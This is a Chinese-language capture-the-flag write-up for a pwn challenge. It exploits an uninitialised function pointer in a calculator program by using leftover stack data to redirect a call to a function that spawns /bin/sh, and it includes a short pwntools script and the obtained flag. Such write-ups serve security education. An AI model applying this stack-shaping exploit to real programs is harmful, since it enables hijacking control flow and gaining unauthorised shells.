# unreachable

## 题目简述

计算器在 `calc()` 中声明函数指针 `opfn op`，但当菜单选项不在 1 至 7 时，`switch` 不会为它赋值，程序仍会执行 `op(a,b)`。二进制另有 `unreachable()` 执行 `/bin/sh`，因此目标是利用栈内存复用，让未初始化指针继承这个函数地址。

## 解题过程

程序所有整数输入都经过 `read_u64()`。该函数把 32 字节读入局部缓冲区，再用 `strtoull` 解析开头的数字。第一次主菜单输入可同时放入有效选项 `1` 和一段不会参与数字解析的地址数据：

```python
from pwn import *

p = process("dist/unreachable.bin")

# 0x40125b 为附件二进制中 unreachable() 的地址。
p.sendlineafter(b"opt", flat({0: b"1\n", 0x10: p64(0x40125b)}))
p.sendlineafter(b"calc", b"8")
p.sendlineafter(b"a", b"0")
p.sendlineafter(b"b", b"0")
p.interactive()
```

`read_u64` 返回后不会清零栈。随后 `calc` 的未初始化 `op` 恰好复用了偏移 `0x10` 处残留的地址；选择 `8` 绕过全部赋值分支，最终的间接调用便跳到 `unreachable()`。读取到：

```text
greyhats{uN1nit_p0w4_as12kla}
```

## 方法总结

未初始化局部变量的值来自旧栈内容，不是“真正随机”。若攻击者能控制此前使用同一栈槽的函数输入，就可能稳定塑造函数指针。此类利用高度依赖编译后二进制的栈布局和函数地址，必须以反汇编或调试结果验证，源码层面的变量顺序只能提供线索。
